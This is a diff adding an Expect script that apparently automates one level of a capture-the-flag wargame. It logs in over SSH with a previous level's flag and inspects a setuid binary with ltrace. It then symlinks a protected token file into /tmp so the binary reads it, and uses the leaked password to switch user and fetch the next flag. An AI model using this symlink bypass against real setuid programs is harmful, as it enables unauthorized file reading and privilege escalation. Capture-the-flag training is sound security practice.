@@ -1,0 +1,33 @@
+#!/usr/bin/expect
+
+set ip [ lindex $argv 0 ]
+set port [ lindex $argv 1 ]
+set user [ lindex $argv 2 ]
+set password [ exec cat "../../flag07/flag" ]
+
+spawn ssh "$user\@$ip" "-p $port"
+
+expect "password:" { send "$password\r" }
+
+expect -re {\$ $}
+	send "ls -aRl\r"
+	send "ltrace ./level08 token\r"
+	send "ln -s /home/user/level08/token /tmp/t\r"
+	send "./level08 /tmp/t\r"
+	send "su flag08\r"
+
+set flagpwd [exec cat "flagpwd"]
+expect "Password:" { send "$flagpwd\r" }
+	
+expect -re {\$ $}
+	send "getflag\r"
+	send "su level09\r"
+
+set flag [ exec cat ../flag ]
+
+expect "Password:" { send "$flag\r" }
+
+expect -re {\$ $}
+	send "id\r"
+	send "exit\r"
+	send "exit\r"
